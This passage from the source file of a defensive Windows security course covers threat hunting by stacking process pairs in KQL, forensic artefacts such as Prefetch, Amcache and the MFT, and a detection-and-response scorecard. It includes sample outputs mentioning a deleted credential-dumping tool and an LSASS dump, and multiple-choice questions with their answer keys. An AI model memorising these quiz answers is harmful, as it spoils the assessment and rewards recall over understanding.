As on Linux, aggregating an attribute across many hosts and examining the **long tail** is the workhorse: legitimate configuration is uniform, so the rare value is where evil hides. "Show me every parent→child pair and their counts; look at the ones that occur once" finds LOLBin abuse that no single-event rule caught.

## Why hunt

Rules catch the known; hunting catches the unknown and shortens **dwell time** — the attacker's window. Every hunt, successful or not, also reveals visibility gaps (an attack you *couldn't* have queried for), which feed back into your logging (WEF subscriptions, Sysmon config) and your detection backlog. Hunting is how a mature Windows program keeps finding what its automated detections did not.`,
      sample: {
        lang: 'text',
        caption: 'Stacking parent-child process pairs to surface LOLBin abuse (KQL)',
        code: `DeviceProcessEvents
| summarize Hosts=dcount(DeviceName), Count=count()
    by InitiatingProcessFileName, FileName
| order by Count asc      // rarest pairs first — the long tail`,
        output: `InitiatingProcess  FileName       Hosts  Count
-----------------  ------------   -----  -----
winword.exe        certutil.exe       1      1   <- rare: hunt this
mshta.exe          powershell.exe     1      2   <- rare: hunt this
explorer.exe       chrome.exe      4210  91002   (normal, ignore)
services.exe       svchost.exe     4211  60113   (normal, ignore)
# The one-off pairs at the top are where attacker LOLBin abuse
# hides. Frequency analysis turns "find evil" into "look at the tail".`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'In Windows threat hunting, why is "stacking" process attributes (like parent-child pairs) across the fleet and examining the rarest values so productive?',
        options: [
          'Common process pairs are always malicious',
          'Legitimate activity is highly uniform across similar machines, so aggregating an attribute and looking at the long tail — the pairs or paths that occur once or twice — surfaces the anomalous, non-standard behaviour where attacker activity (like LOLBin abuse) hides',
          'It reduces how much data you must collect',
          'Rare events are always false positives',
        ],
        answer: 1,
        explain:
          'The same frequency-analysis principle as on Linux: normal configuration and behaviour repeat across the fleet, so intrusions appear as outliers. Stacking a parent-child pair (or binary path, or service name) and sorting by count puts the rare, non-standard combinations — Office spawning certutil, svchost from AppData — at the top as high-value leads. It converts an open-ended "find evil" into the tractable "inspect the long tail."',
        hint: 'On thousands of similar machines, where does an attacker’s non-standard behaviour show up in the counts?',
      },
    },

    {
      id: 'bwin-s-11',
      title: 'Windows forensic artefacts',
      read: `When you must reconstruct what happened on a Windows host — especially execution and file activity the logs did not capture — you turn to **forensic artefacts**: structures Windows maintains for its own purposes that happen to record attacker activity.

## Execution artefacts (what ran)

- **Prefetch** (\`C:\\Windows\\Prefetch\\*.pf\`) — Windows creates these to speed app launches; each records that a program ran, how many times, and when it was last run. Great for "did this malware execute, and when?"
- **Amcache / Shimcache (AppCompatCache)** — application-compatibility databases that record executables seen/run, with paths and timestamps — even for programs no longer on disk. Key for proving execution of deleted tools.
- **UserAssist**, **RunMRU**, **BAM/DAM** — registry-based execution and activity records per user.

## File-system artefacts (what changed)

- **\$MFT** (Master File Table) — an entry for every file on NTFS, with MACB timestamps. Parsing it reconstructs file creation/modification even after deletion.
- **\$UsnJrnl** (USN Change Journal) — a log of every change to files (create, delete, rename) — superb for a timeline of what the attacker wrote and removed.
- **\$LogFile**, **\$I30** — more NTFS metadata useful for timelining and detecting timestomping (the timestamps disagree).

## Acquisition and tooling

- **KAPE** — collects these artefacts fast (targeted triage collection) and can run parsers on them.
- **Eric Zimmerman's tools** (MFTECmd, PECmd, AmcacheParser, etc.) — the standard parsers.
- **WinPMEM / DumpIt** — memory capture; Volatility has Windows plugins (the memory-forensics lesson applies here too).

## Why these matter

Logs may be disabled, cleared, or never configured — but Windows leaves these artefacts as a byproduct of normal operation, often recording execution and file activity the attacker did not think to erase (and some, like Shimcache/Amcache, persist even after the file is deleted). Correlating prefetch + amcache + \$MFT + \$UsnJrnl into a **super-timeline** (plaso works on Windows too) reconstructs the intrusion — entry, execution, staging, exfiltration — even when the event logs are silent. Knowing these artefacts is what lets a skilled responder answer "what happened here?" on a host that was not well-instrumented.`,
      sample: {
        lang: 'text',
        caption: 'Proving execution of a deleted tool via Amcache + Prefetch',
        code: `# the attacker deleted mimikatz.exe — but Windows remembers it ran:

AmcacheParser:
  Path: C:\\Users\\jdoe\\AppData\\Local\\Temp\\mk.exe
  SHA1: a1b2c3...    FirstRun: 2024-06-03 14:23:11
  (file no longer on disk — Amcache retained the record)

PECmd (Prefetch MK.EXE-9F3A.pf):
  RunCount: 3    LastRun: 2024-06-03 14:41:02
  Files referenced: lsass.dmp   <- it touched an LSASS dump`,
        output: `Even though the binary was deleted and no 4688 was logged,
Amcache proves it existed and ran, Prefetch proves how often
and when, and the referenced lsass.dmp reveals what it did.
Windows' own artefacts told the story the logs did not.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'An attacker ran a tool and then deleted it, and process-creation logging was not enabled. How can forensic artefacts still prove the tool executed?',
        options: [
          'They cannot — a deleted file leaves no trace',
          'Windows maintains artefacts like Amcache/Shimcache and Prefetch as a byproduct of normal operation; these record that a program was present and executed (with paths and timestamps) and some persist even after the file is deleted, so execution can be proven without the event logs',
          'The tool re-downloads itself for analysis',
          'Only antivirus logs can show it',
        ],
        answer: 1,
        explain:
          'Windows keeps compatibility and performance artefacts — Amcache/Shimcache and Prefetch — that record executables seen and run, including their paths and run times, and Shimcache/Amcache entries survive deletion of the file. Combined with \$MFT and \$UsnJrnl for file activity and a plaso super-timeline, a responder reconstructs execution and file changes even on a host where logging was off or cleared. These artefacts are why "they deleted it" rarely means "we can’t prove it."',
        hint: 'Windows keeps records of what ran for its own performance/compatibility reasons — do those survive the file being deleted?',
      },
    },

    {
      id: 'bwin-s-12',
      title: 'Project: a Windows detection-and-response capability',
      read: `Bring the level together into what a skilled Windows defender is actually judged on: a working, measured **detection-and-response capability** for a Windows/AD environment — the pieces engineered, integrated, and validated.

## The capability, assembled

**Telemetry (see everything that matters)**
- WEF collector with curated subscriptions; Sysmon deployed fleet-wide with an engineered, ATT&CK-mapped, version-controlled config; PowerShell + command-line logging on. All feeding a SIEM with normalised schema.

**Detection (catch the techniques)**
- Version-controlled, tuned, ATT&CK-tagged rules (Sigma → your SIEM) for the AD attacks (intermediate level) and LOLBins; false-positive rates tracked; noisy rules pruned.
- Deception seeded: honey accounts (Kerberoast canaries), honey credentials, honey shares — high-fidelity tripwires along the enumeration path.

**Prevention (block the techniques)**
- ASR rules (audited → enforced), exploit protection, VBS (Credential Guard + HVCI), application control (→ CLM), LAPS, tiering, Protected Users, host-firewall segmentation, security baseline applied by GPO/Intune and scored.

**Response (act fast)**
- Practised IR: EDR isolate/kill, forensic triage (KAPE + Zimmerman tools + memory) and super-timeline, golden-ticket/krbtgt recovery known.

## Validate it (purple loop)

Emulate techniques (Atomic Red Team, benign AD-attack modes) in the lab/controlled scope, confirm each is **detected or blocked**, measure **MTTD**, close gaps (missing telemetry → fix WEF/Sysmon; missing rule → write it; should-have-blocked → fix the control), and re-test. Track ATT&CK coverage, baseline compliance score, and BloodHound paths-to-DA toward zero.

## The measure of success

A junior installs antivirus. A skilled defender delivers a **measured capability**: fleet-wide tamper-resistant telemetry, tuned detections mapped to ATT&CK and validated by emulation, layered prevention (ASR/VBS/app-control/tiering/segmentation) applied and scored, deception catching recon, and a rehearsed response with the forensic depth to reconstruct an incident. And they can show the numbers — coverage, MTTD, compliance — improving because of specific work.

> Everything here is engineered, version-controlled, deployed at scale, and re-measured on a schedule. That loop — instrument, detect, prevent, validate, improve — is what a professional Windows defence program looks like, and it is exactly what the pro level builds on.`,
      sample: {
        lang: 'text',
        caption: 'A Windows detection-and-response capability scorecard',
        code: `Capability area          Built            Validated (emulated)   Metric
------------------------------------------------------------------------------
Telemetry (WEF+Sysmon)   fleet-wide       events confirmed       98% enrolled
AD attack detections     Sigma->SIEM      Kerberoast/DCSync fire  MTTD 4 min
LOLBin detections        parent-child     Office->certutil fires  FP rate 6%
Prevention (ASR/VBS/AC)  enforced         payload blocked in lab  CIS 96%
Deception (honey acct)   seeded           roast canary fired      0 FP
Paths to Domain Admin    BloodHound       cut and re-measured     0 short paths
Response (EDR+forensics) rehearsed        isolate+timeline drill  MTTR 45 min`,
        output: `Instrumented, detected, prevented, validated, measured —
and improving on a schedule. That is a Windows defence
program, not a product install. The pro level goes deeper still.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What distinguishes a skilled Windows defender’s "detection-and-response capability" from simply deploying antivirus and a firewall?',
        options: [
          'It uses more expensive products',
          'It is an engineered, integrated, measured system — fleet-wide tamper-resistant telemetry, tuned ATT&CK-mapped detections validated by emulation, layered prevention applied and scored, deception, and rehearsed response — with metrics (coverage, MTTD, compliance, paths-to-DA) that improve through a repeatable validate-and-tune loop',
          'It disables more Windows features',
          'It removes the need for patching',
        ],
        answer: 1,
        explain:
          'The step up is from products to an engineered capability: telemetry you curated and centralized, detections you version-control, tune and prove fire (via emulation), prevention you audited then enforced and scored, deception catching recon, and response you have rehearsed with real forensic depth — all measured (ATT&CK coverage, MTTD/MTTR, baseline score, BloodHound paths) and improved on a schedule. It is defence you can apply at scale, validate, and evidence, not a one-time install.',
        hint: 'Think integrated, validated and measured across the fleet — versus installing a couple of products.',
      },
    },
  ],
}

export default level
